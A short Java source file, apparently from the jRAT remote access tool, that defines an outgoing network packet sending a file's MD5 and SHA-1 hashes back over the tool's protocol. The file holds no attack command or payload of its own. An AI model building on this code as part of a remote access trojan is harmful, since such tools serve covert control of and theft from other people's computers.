package jrat.module.fs.packets;

import jrat.client.packets.outgoing.AbstractOutgoingPacket;
import jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet46FileHash extends AbstractOutgoingPacket {

	private String md5;
	private String sha1;

	public Packet46FileHash(String md5, String sha1) {
		this.md5 = md5;
		this.sha1 = sha1;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(md5);
		sw.writeLine(sha1);
	}

	@Override
	public short getPacketId() {
		return 46;
	}

}
